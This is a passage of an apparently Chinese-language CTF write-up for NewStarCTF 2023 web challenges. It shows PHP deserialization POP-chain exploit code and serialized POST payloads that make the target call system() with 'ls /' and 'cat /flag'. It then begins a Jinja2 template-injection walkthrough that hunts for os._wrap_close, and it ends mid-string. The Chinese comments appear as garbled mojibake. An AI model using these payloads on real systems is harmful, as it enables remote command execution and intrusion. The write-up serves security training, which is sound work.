class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-comment">//ååºåˆ—åŒ–è‡ªåŠ¨è°ƒç”¨</span><br>    <span class="hljs-comment">// public function __destruct()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //å­˜åœ¨å­—ç¬¦ä¸²æ¯”è¾ƒå¯ä»¥è°ƒç”¨__toString()å‡½æ•°=&gt;$this-&gt;name=new Then()</span><br>    <span class="hljs-comment">//     if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$this-&gt;name))&#123;</span><br>    <span class="hljs-comment">//         echo &quot;Hello&quot;;</span><br>    <span class="hljs-comment">//     &#125;else&#123;</span><br>    <span class="hljs-comment">//         echo &quot;Welcome to NewStarCTF 2023!&quot;;</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å­˜åœ¨ç±»è°ƒç”¨ï¼Œå¯ä»¥ç”¨äºå¯åŠ¨__invoke()å‡½æ•°</span><br>        <span class="hljs-comment">//$this-&gt;func=new Super()</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br>    &#125;<br>    <span class="hljs-comment">// public function __call($func, $vars)</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //å­˜åœ¨å¯ä»¥æŒ‡å®šç±»çš„å‡½æ•°end()å‡½æ•°è°ƒç”¨</span><br>    <span class="hljs-comment">//     //$this-&gt;obj=new CTF()</span><br>    <span class="hljs-comment">//     $this-&gt;obj-&gt;end();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();<br>    &#125;<br>    <span class="hljs-comment">// public function __invoke()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //getSträ¸ºHandleç±»çš„ä¸å­˜åœ¨å‡½æ•°æ‰€ä»¥å¯ä»¥ç”¨äºè°ƒç”¨__call</span><br>    <span class="hljs-comment">//     //$this-&gt;obj=new Handle()</span><br>    <span class="hljs-comment">//     $this-&gt;obj-&gt;getStr();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function end()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     die(&quot;==GAME OVER==&quot;);</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();<br>    &#125;<br>    <span class="hljs-comment">// public function end()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //å­˜åœ¨å˜é‡åˆ é™¤å‡½æ•°å¯ä»¥è°ƒç”¨é­”æœ¯æ–¹æ³•__unset</span><br>    <span class="hljs-comment">//     //$this-&gt;handle=new WhiteGod()</span><br>    <span class="hljs-comment">//     unset($this-&gt;handle-&gt;log);</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br><br>    <span class="hljs-comment">// public function __unset($var)</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //å­˜åœ¨å±é™©å‡½æ•°æ³¨å…¥=&gt;$this-&gt;func=system,$this-&gt;var=ls /</span><br>    <span class="hljs-comment">//     ($this-&gt;func)($this-&gt;var);    </span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-comment">// @unserialize($_POST[&#x27;pop&#x27;]); </span><br><span class="hljs-comment">//æ„é€ popé“¾:</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>();<br><span class="hljs-variable">$obj</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>();<br><span class="hljs-variable">$obj2</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj2</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$obj3</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj3</span>;<br><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pop=O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>



<p><img src="/images/2023-11-3-newstar-3/image-20231010133441613.png" srcset="/img/loading.gif" lazyload alt="image-20231010133441613"></p>
<p>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pop=O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/images/2023-11-3-newstar-3/image-20231010133746261.png" srcset="/img/loading.gif" lazyload alt="image-20231010133746261"></p>
<h2 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h2><p><img src="/images/2023-11-3-newstar-3/image-20231010141411989.png" srcset="/img/loading.gif" lazyload alt="image-20231010141411989"></p>
<p>ä½¿ç”¨BpæŠ“åŒ…:</p>
<p><img src="/images/2023-11-3-newstar-3/image-20231010141442978.png" srcset="/img/loading.gif" lazyload alt="image-20231010141442978"></p>
<p>è®¿é—®:&#x2F;secr3tofpop</p>
<p><img src="/images/2023-11-3-newstar-3/image-20231010141614595.png" srcset="/img/loading.gif" lazyload alt="image-20231010141614595"></p>
<p>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=admin<br></code></pre></td></tr></table></figure>

<p><img src="/images/2023-11-3-newstar-3/image-20231010141800190.png" srcset="/img/loading.gif" lazyload alt="image-20231010141800190"></p>
<p>æˆ‘ä»¬è¾“å…¥çš„å†…å®¹è¢«æ¸²æŸ“åˆ°äº†ç½‘é¡µä¸Šï¼ŒçŒœæµ‹å­˜åœ¨sstiæ¨¡æ¿æ³¨å…¥</p>
<p>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%%&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/images/2023-11-3-newstar-3/image-20231010162819362.png" srcset="/img/loading.gif" lazyload alt="image-20231010162819362"></p>
<p>å¯ä»¥äº†è§£åˆ°è¯¥sstiæ¨¡æ¿æ³¨å…¥æ˜¯åœ¨python3è¯­è¨€ä¸‹çš„jinja2æ¨¡æ¿æ³¨å…¥</p>
<p><img src="/images/2023-11-3-newstar-3/image-20231010163040317.png" srcset="/img/loading.gif" lazyload alt="image-20231010163040317"></p>
<p>å¯ä»¥äº†è§£åˆ°è¯¥æ¨¡æ¿æ¸²æŸ“æ˜¯ä½¿ç”¨render_template_string()å‡½æ•°</p>
<p>å…ˆå¯»æ‰¾ç±»os._wrap_closeï¼š<br>å¯»æ‰¾è„šæœ¬:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;zipimport._ZipImportResourceReader&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;__future__._Feature&#x27;&gt;, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;, &lt;class &#x27;enum.auto&#x27;&gt;, &lt;enum &#x27;Enum&#x27;&gt;, &lt;class &#x27;re.Pattern&#x27;&gt;, &lt;class &#x27;re.Match&#x27;&gt;, &lt;class &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;sre_parse.State&#x27;&gt;, &lt;class &#x27;sre_parse.SubPattern&#x27;&gt;, &lt;class &#x27;sre_parse.Tokenizer&#x27;&gt;, &lt;class &#x27;operator.itemgetter&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;itertools.accumulate&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;itertools.dropwhile&#x27;&gt;, &lt;class &#x27;itertools.takewhile&#x27;&gt;, &lt;class &#x27;itertools.islice&#x27;&gt;, &lt;class &#x27;itertools.starmap&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;itertools.zip_longest&#x27;&gt;, &lt;class &#x27;itertools.permutations&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;itertools.groupby&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;reprlib.Repr&#x27;&gt;, &lt;class &#x27;collections.deque&#x27;&gt;, &lt;class &#x27;_collections._deque_iterator&#x27;&gt;, &lt;class &#x27;_collections._deque_reverse_iterator&#x27;&gt;, &lt;class &#x27;_collections._tuplegetter&#x27;&gt;, &lt;class &#x27;collections._Link&#x27;&gt;, &lt;class &#x27;functools.partial&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;functools.singledispatchmethod&#x27;&gt;, &lt;class &#x27;functools.cached_property&#x27;&gt;, &lt;class &#x27;re.Scanner&#x27;&gt;, &lt;class &#x27;tokenize.Untokenizer&#x27;&gt;, &lt;class &#x27;traceback.FrameSummary&#x27;&gt;, &lt;class &#x27;traceback.TracebackException&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;weakref.finalize._Info&#x27;&gt;, &lt;class &#x27;weakref.finalize&#x27;&gt;, &lt;class &#x27;string.Template&#x27;&gt;, &lt;class &#x27;string.Formatter&#x27;&gt;, &lt;class &#x27;threading._RLock&#x27;&gt;, &lt;class &#x27;threading.Condition&#x27;&gt;, &lt;class &#x27;threading.Semaphore&#x27;&gt;, &lt;class &#x27;threading.Event&#x27;&gt;, &lt;class &#x27;threading.Barrier&#x27;&gt;, &lt;class &#x27;threading.Thread&#x27;&gt;, &lt;class &#x27;logging.LogRecord&#x27;&gt;, &lt;class &#x27;logging.PercentStyle&#x27;&gt;, &lt;class &#x27;logging.Formatter&#x27;&gt;, &lt;class &#x27;logging.BufferingFormatter&#x27;&gt;, &lt;class &#x27;logging.Filter&#x27;&gt;, &lt;class &#x27;logging.Filterer&#x27;&gt;, &lt;class &#x27;logging.PlaceHolder&#x27;&gt;, &lt;class &#x27;logging.Manager&#x27;&gt;, &lt;class &#x27;logging.LoggerAdapter&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;, &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;, &lt;class &#x27;typing._Final&#x27;&gt;, &lt;class &#x27;typing._Immutable&#x27;&gt;, &lt;class &#x27;typing.Generic&#x27;&gt;, &lt;class &#x27;typing._TypingEmpty&#x27;&gt;, &lt;class &#x27;typing._TypingEllipsis&#x27;&gt;, &lt;class &#x27;typing.NamedTuple&#x27;&gt;, &lt;class &#x27;typing.io&#x27;&gt;, &lt;class &#x27;typing.re&#x27;&gt;, &lt;class &#x27;select.poll&#x27;&gt;, &lt;class &#x27;select.epoll&#x27;&gt;, &lt;class &#x27;selectors.BaseSelector&#x27;&gt;, &lt;class &#x27;_socket.socket&#x27;&gt;, &lt;class &#x27;Struct&#x27;&gt;, &lt;class &#x27;unpack_iterator&#x27;&gt;, &lt;class &#x27;email.charset.Charset&#x27;&gt;, &lt;class &#x27;email.header.Header&#x27;&gt;, &lt;class &#x27;email.header._ValueFormatter&#x27;&gt;, &lt;class &#x27;_sha512.sha384&#x27;&gt;, &lt;class &#x27;_sha512.sha512&#x27;&gt;, &lt;class &#x27;_random.Random&#x27;&gt;, &lt;class &#x27;datetime.timedelta&#x27;&gt;, &lt;class &#x27;datetime.date&#x27;&gt;, &lt;class &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class &#x27;datetime.date&#x27;&gt;, &lt;class &#x27;datetime.timedelta&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinStr&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinBytes&#x27;&gt;, &lt;class &#x27;urllib.parse._NetlocResultMixinBase&#x27;&gt;, &lt;class &#x27;calendar._localized_month&#x27;&gt;, &lt;class &#x27;calendar._localized_day&#x27;&gt;, &lt;class &#x27;calendar.Calendar&#x27;&gt;, &lt;class &#x27;calendar.different_locale&#x27;&gt;, &lt;class &#x27;email._parseaddr.AddrlistClass&#x27;&gt;, &lt;class &#x27;email._policybase._PolicyBase&#x27;&gt;, &lt;class &#x27;email.feedparser.BufferedSubFile&#x27;&gt;, &lt;class &#x27;email.feedparser.FeedParser&#x27;&gt;, &lt;class &#x27;email.parser.Parser&#x27;&gt;, &lt;class &#x27;email.parser.BytesParser&#x27;&gt;, &lt;class &#x27;email.message.Message&#x27;&gt;, &lt;class &#x27;http.client.HTTPConnection&#x27;&gt;, &lt;class &#x27;_ssl._SSLContext&#x27;&gt;, &lt;class &#x27;_ssl._SSLSocket&#x27;&gt;, &lt;class &#x27;_ssl.MemoryBIO&#x27;&gt;, &lt;class &#x27;_ssl.Session&#x27;&gt;, &lt;class &#x27;ssl.SSLObject&#x27;&gt;, &lt;class &#x27;urllib3.util.timeout.Timeout&#x27;&gt;, &lt;class &#x27;_ast.AST&#x27;&gt;, &lt;class &#x27;urllib3.util.retry.Retry&#x27;&gt;, &lt;class &#x27;_hashlib.HASH&#x27;&gt;, &lt;class &#x27;_blake2.blake2b&#x27;&gt;, &lt;class &#x27;_blake2.blake2s&#x27;&gt;, &lt;class &#x27;_sha3.sha3_224&#x27;&gt;, &lt;class &#x27;_sha3.sha3_256&#x27;&gt;, &lt;class &#x27;_sha3.sha3_384&#x27;&gt;, &lt;class &#x27;_sha3.sha3_512&#x27;&gt;, &lt;class &#x27;_sha3.shake_128&#x27;&gt;, &lt;class &#x27;_sha3.shake_256&#x27;&gt;, &lt;class &#x27;hmac.HMAC&#x27;&gt;, &lt;class &#x27;urllib3.util.ssltransport.SSLTransport&#x27;&gt;, &lt;class &#x27;_queue.SimpleQueue&#x27;&gt;, &lt;class &#x27;queue.Queue&#x27;&gt;, &lt;class &#x27;queue._PySimpleQueue&#x27;&gt;, &lt;class &#x27;_json.Scanner&#x27;&gt;, &lt;class &#x27;_json.Encoder&#x27;&gt;, &lt;class &#x27;json.decoder.JSONDecoder&#x27;&gt;, &lt;class &#x27;json.encoder.JSONEncoder&#x27;&gt;, &lt;class &#x27;mimetypes.MimeTypes&#x27;&gt;, &lt;class &#x27;urllib3.fields.RequestField&#x27;&gt;, &lt;class &#x27;zlib.Compress&#x27;&gt;, &lt;class &#x27;zlib.Decompress&#x27;&gt;, &lt;class &#x27;ipaddress._IPAddressBase&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV4&#x27;&gt;, &lt;class &#x27;ipaddress._IPv4Constants&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV6&#x27;&gt;, &lt;class &#x27;ipaddress._IPv6Constants&#x27;&gt;, &lt;class &#x27;urllib3.connection.DummyConnection&#x27;&gt;, &lt;class &#x27;urllib3.response.ContentDecoder&#x27;&gt;, &lt;class &#x27;urllib3.response.GzipDecoderState&#x27;&gt;, &lt;class &#x27;urllib3.response.BytesQueueBuffer&#x27;&gt;, &lt;class &#x27;urllib3._request_methods.RequestMethods&#x27;&gt;, &lt;class &#x27;urllib3.connectionpool.ConnectionPool&#x27;&gt;, &lt;class &#x27;MultibyteCodec&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalEncoder&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalDecoder&#x27;&gt;, &lt;class &#x27;MultibyteStreamReader&#x27;&gt;, 